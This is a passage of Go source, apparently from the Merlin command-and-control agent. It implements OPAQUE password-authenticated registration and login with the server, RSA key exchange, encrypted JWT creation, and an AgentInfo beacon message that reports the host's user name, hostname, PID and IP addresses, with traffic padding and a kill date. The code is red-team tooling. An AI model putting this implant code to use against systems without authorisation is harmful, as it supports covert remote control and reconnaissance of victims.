	a.JWT = agentJWT

	regInitResp, errRegInitResp := a.sendMessage("POST", regInitBase)

	if errRegInitResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE user registration initialization message:\r\n%s", errRegInitResp.Error())
	}

	if regInitResp.Type != "RegInit" {
		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration initialization", regInitResp.Type)
	}

	var serverRegInit gopaque.ServerRegisterInit

	errServerRegInit := serverRegInit.FromBytes(gopaque.CryptoDefault, regInitResp.Payload.([]byte))
	if errServerRegInit != nil {
		return fmt.Errorf("there was an error unmarshalling the OPAQUE server register initialization message from bytes:\r\n%s", errServerRegInit.Error())
	}

	if a.Verbose {
		message("note", "Received OPAQUE server registration initialization message")
	}

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE Beta: %v", serverRegInit.Beta))
		message("debug", fmt.Sprintf("OPAQUE V: %v", serverRegInit.V))
		message("debug", fmt.Sprintf("OPAQUE PubS: %s", serverRegInit.ServerPublicKey))
	}

	// TODO extend gopaque to run RwdU through n iterations of PBKDF2
	userRegComplete := userReg.Complete(&serverRegInit)

	userRegCompleteBytes, errUserRegCompleteBytes := userRegComplete.ToBytes()
	if errUserRegCompleteBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user registration complete message to bytes:\r\n%s", errUserRegCompleteBytes.Error())
	}

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE EnvU: %v", userRegComplete.EnvU))
		message("debug", fmt.Sprintf("OPAQUE PubU: %v", userRegComplete.UserPublicKey))
	}

	// message to be sent to the server
	regCompleteBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "RegComplete",
		Payload: userRegCompleteBytes,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	regCompleteResp, errRegCompleteResp := a.sendMessage("POST", regCompleteBase)

	if errRegCompleteResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE user registration complete message:\r\n%s", errRegCompleteResp.Error())
	}

	if regCompleteResp.Type != "RegComplete" {
		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration complete", regCompleteResp.Type)
	}

	if a.Verbose {
		message("note", "OPAQUE registration complete")
	}

	return nil
}

// opaqueAuthenticate is used to authenticate an agent leveraging the OPAQUE Password Authenticated Key Exchange (PAKE) protocol
func (a *Agent) opaqueAuthenticate() error {

	if a.Verbose {
		message("note", "Starting OPAQUE Authentication")
	}

	// 1 - Create a NewUserAuth with an embedded key exchange
	userKex := gopaque.NewKeyExchangeSigma(gopaque.CryptoDefault)
	userAuth := gopaque.NewUserAuth(gopaque.CryptoDefault, a.ID.Bytes(), userKex)

	// 2 - Call Init with the password and send the resulting UserAuthInit to the server
	userAuthInit, err := userAuth.Init(a.secret)
	if err != nil {
		return fmt.Errorf("there was an error creating the OPAQUE user authentication initialization message:\r\n%s", err.Error())
	}

	userAuthInitBytes, errUserAuthInitBytes := userAuthInit.ToBytes()
	if errUserAuthInitBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user authentication initialization message to bytes:\r\n%s", errUserAuthInitBytes.Error())
	}

	// message to be sent to the server
	authInitBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "AuthInit",
		Payload: userAuthInitBytes,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Set secret for JWT and JWE encryption key from PSK
	k := sha256.Sum256([]byte(a.psk))
	a.secret = k[:]

	// Create JWT using pre-authentication pre-shared key; updated by server after authentication
	agentJWT, errJWT := a.getJWT()
	if errJWT != nil {
		return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE authentication:\r\n%s", errJWT)
	}
	a.JWT = agentJWT

	authInitResp, errAuthInitResp := a.sendMessage("POST", authInitBase)

	if errAuthInitResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE authentication initialization message:\r\n%s", errAuthInitResp.Error())
	}

	if authInitResp.Type != "AuthInit" {
		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user authentication initialization", authInitResp.Type)
	}

	// 3 - Receive the server's ServerAuthComplete
	var serverComplete gopaque.ServerAuthComplete

	errServerComplete := serverComplete.FromBytes(gopaque.CryptoDefault, authInitResp.Payload.([]byte))
	if errServerComplete != nil {
		return fmt.Errorf("there was an error unmarshalling the OPAQUE server complete message from bytes:\r\n%s", errServerComplete.Error())
	}

	// 4 - Call Complete with the server's ServerAuthComplete. The resulting UserAuthFinish has user and server key
	// information. This would be the last step if we were not using an embedded key exchange. Since we are, take the
	// resulting UserAuthComplete and send it to the server.
	_, userAuthComplete, errUserAuth := userAuth.Complete(&serverComplete)
	if errUserAuth != nil {
		return fmt.Errorf("there was an error completing OPAQUE authentication:\r\n%s", errUserAuth)
	}

	userAuthCompleteBytes, errUserAuthCompleteBytes := userAuthComplete.ToBytes()
	if errUserAuthCompleteBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user authentication complete message to bytes:\r\n%s", errUserAuthCompleteBytes.Error())
	}

	authCompleteBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "AuthComplete",
		Payload: &userAuthCompleteBytes,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Save the OPAQUE derived Diffie-Hellman secret
	a.secret = []byte(userKex.SharedSecret.String())

	// Send the User Auth Complete message
	authCompleteResp, errAuthCompleteResp := a.sendMessage("POST", authCompleteBase)

	if errAuthCompleteResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE authentication completion message:\r\n%s", errAuthCompleteResp.Error())
	}

	if authCompleteResp.Token != "" {
		a.JWT = authCompleteResp.Token
	}

	switch authCompleteResp.Type {
	case "ServerOk":
		if a.Verbose {
			message("success", "Agent authentication successful")
		}
		if a.Debug {
			message("debug", "Leaving agent.opaqueAuthenticate without error")
		}
		return nil
	default:
		return fmt.Errorf("received unexpected or unrecognized message type during OPAQUE authentication completion:\r\n%s", authCompleteResp.Type)
	}

}

// rsaKeyExchange is use to create and exchange RSA keys with the server
func (a *Agent) rsaKeyExchange() error {
	if a.Debug {
		message("debug", "Entering into rsaKeyExchange function")
	}

	pk := messages.KeyExchange{
		PublicKey: a.RSAKeys.PublicKey,
	}

	m := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "KeyExchange",
		Payload: pk,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Send KeyExchange to server
	resp, reqErr := a.sendMessage("POST", m)

	if reqErr != nil {
		return fmt.Errorf("there was an error sending the key exchange message:\r\n%s", reqErr.Error())
	}

	// Handle KeyExchange response from server
	_, errKeyExchange := a.messageHandler(resp)

	if errKeyExchange != nil {
		return fmt.Errorf("there was an error handling the RSA key exchange response message:\r\n%s", errKeyExchange)
	}

	if a.Debug {
		message("debug", "Leaving rsaKeyExchange function without error")
	}
	return nil
}

// getJWT is used to send an unauthenticated JWT on the first message to the server
func (a *Agent) getJWT() (string, error) {
	// Create encrypter
	encrypter, encErr := jose.NewEncrypter(jose.A256GCM,
		jose.Recipient{
			Algorithm: jose.DIRECT, // Doesn't create a per message key
			Key:       a.secret},
		(&jose.EncrypterOptions{}).WithType("JWT").WithContentType("JWT"))
	if encErr != nil {
		return "", fmt.Errorf("there was an error creating the JWT encryptor:\r\n%s", encErr.Error())
	}

	// Create signer
	signer, errSigner := jose.NewSigner(jose.SigningKey{
		Algorithm: jose.HS256,
		Key:       a.secret},
		(&jose.SignerOptions{}).WithType("JWT"))
	if errSigner != nil {
		return "", fmt.Errorf("there was an error creating the JWT signer:\r\n%s", errSigner.Error())
	}

	// Build JWT claims
	cl := jwt.Claims{
		Expiry:   jwt.NewNumericDate(time.Now().UTC().Add(time.Second * 10)),
		IssuedAt: jwt.NewNumericDate(time.Now().UTC()),
		ID:       a.ID.String(),
	}

	agentJWT, err := jwt.SignedAndEncrypted(signer, encrypter).Claims(cl).CompactSerialize()
	if err != nil {
		return "", fmt.Errorf("there was an error serializing the JWT:\r\n%s", err)
	}

	// Parse it to check for errors
	_, errParse := jwt.ParseSignedAndEncrypted(agentJWT)
	if errParse != nil {
		return "", fmt.Errorf("there was an error parsing the encrypted JWT:\r\n%s", errParse.Error())
	}

	return agentJWT, nil
}

// getAgentInfoMessage is used to place of the information about an agent and it's configuration into a message and return it
func (a *Agent) getAgentInfoMessage() messages.Base {
	sysInfoMessage := messages.SysInfo{
		Platform:     a.Platform,
		Architecture: a.Architecture,
		UserName:     a.UserName,
		UserGUID:     a.UserGUID,
		HostName:     a.HostName,
		Pid:          a.Pid,
		Ips:          a.Ips,
	}

	agentInfoMessage := messages.AgentInfo{
		Version:       merlin.Version,
		Build:         build,
		WaitTime:      a.WaitTime.String(),
		PaddingMax:    a.PaddingMax,
		MaxRetry:      a.MaxRetry,
		FailedCheckin: a.FailedCheckin,
		Skew:          a.Skew,
		Proto:         a.Proto,
		SysInfo:       sysInfoMessage,
		KillDate:      a.KillDate,
	}

	baseMessage := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "AgentInfo",
		Payload: agentInfoMessage,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	return baseMessage
}

// TODO centralize this into a package because it is used here and in the server
// message is used to print a message to the command line
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

// TODO add cert stapling
// TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
// TODO Add standard function for printing messages like in the JavaScript agent. Make it a lib for agent and server?
// TODO configure set UserAgent agentcontrol message
